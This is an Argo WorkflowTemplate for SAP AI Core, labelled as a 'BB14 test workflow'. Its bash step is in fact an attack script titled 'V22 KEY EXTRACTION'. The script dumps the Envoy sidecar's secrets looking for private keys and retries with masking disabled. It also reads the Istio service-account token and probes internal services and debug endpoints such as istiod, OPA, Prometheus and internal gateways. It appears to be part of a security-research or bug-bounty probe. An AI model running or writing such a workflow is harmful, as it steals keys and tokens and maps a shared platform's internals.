apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "22.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V22 KEY EXTRACTION + NEW SERVICES ==="
        
        echo "=== SDS RAW KEY SECTION ==="
        SDS=$(curl -s http://localhost:15000/config_dump?resource=dynamic_active_secrets 2>&1)
        echo "$SDS" | grep -B5 -A5 private_key | head -30
        
        echo "=== TRY UNREDACTED SDS ==="
        curl -s "http://localhost:15000/config_dump?resource=dynamic_active_secrets&mask=false" 2>&1 | grep -B2 -A2 private_key | head -20
        
        echo "=== ENVOY CERTS ENDPOINT ==="
        curl -s http://localhost:15000/certs 2>&1 | head -c 3000
        
        echo ""
        echo "=== PILOT-AGENT SDS SOCKET ==="
        ls -la /etc/istio/proxy/ 2>/dev/null
        ls -la /var/run/secrets/tokens/ 2>/dev/null
        cat /var/run/secrets/tokens/istio-token 2>/dev/null | head -c 200
        echo ""
        
        echo "=== USAGE API ==="
        curl -s http://usage-api-service.usage-api.svc.cluster.local/ 2>&1 | head -c 1000
        curl -s http://usage-api-service.usage-api.svc.cluster.local/api/ 2>&1 | head -c 500
        curl -s http://usage-api-service.usage-api.svc.cluster.local/v1/ 2>&1 | head -c 500
        curl -s http://usage-api-service.usage-api.svc.cluster.local/health 2>&1 | head -c 500
        
        echo ""
        echo "=== DYNATRACE ==="
        curl -s http://dynakube-activegate.dynatrace.svc.cluster.local:443/ -k 2>&1 | head -c 500
        curl -s http://dynakube-activegate.dynatrace.svc.cluster.local:9999/ 2>&1 | head -c 500
        
        echo ""
        echo "=== CONNECTIVITY PROXY ==="
        curl -s http://connectivity-proxy.connectivity-proxy.svc.cluster.local/ 2>&1 | head -c 500
        curl -s http://connectivity-proxy.connectivity-proxy.svc.cluster.local:20003/ 2>&1 | head -c 500
        
        echo ""
        echo "=== NGINX-OPA ==="
        curl -s http://nginx-opa.istio-system.svc.cluster.local/ 2>&1 | head -c 500
        curl -s http://nginx-opa.istio-system.svc.cluster.local:8181/v1/policies 2>&1 | head -c 2000
        
        echo ""
        echo "=== INTERNAL GATEWAY ==="
        curl -s http://internal-domain-gateway.istio-system.svc.cluster.local/ 2>&1 | head -c 500
        curl -s -H "Host: api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com" http://internal-domain-gateway.istio-system.svc.cluster.local/ 2>&1 | head -c 1000
        
        echo ""
        echo "=== ENVOY LISTENERS ==="
        curl -s http://localhost:15000/listeners 2>&1 | head -c 2000
        
        echo ""
        echo "=== PROMETHEUS METRICS ==="
        curl -s http://istio-prometheus-prometheus-istio-server.istio-system.svc.cluster.local:9090/api/v1/targets 2>&1 | head -c 3000
        
        echo ""
        echo "=== CLUSTER-LOCAL GATEWAY ==="
        curl -s http://cluster-local-gateway.istio-system.svc.cluster.local/ 2>&1 | head -c 500
        
        echo ""
        echo "=== ISTIOD DEBUG ENDPOINTS ==="
        curl -s http://istiod.istio-system.svc.cluster.local:15014/debug/endpointz 2>&1 | head -c 3000
        curl -s http://istiod.istio-system.svc.cluster.local:15014/debug/configz 2>&1 | head -c 2000
        
        echo "=== V22 DONE ==="
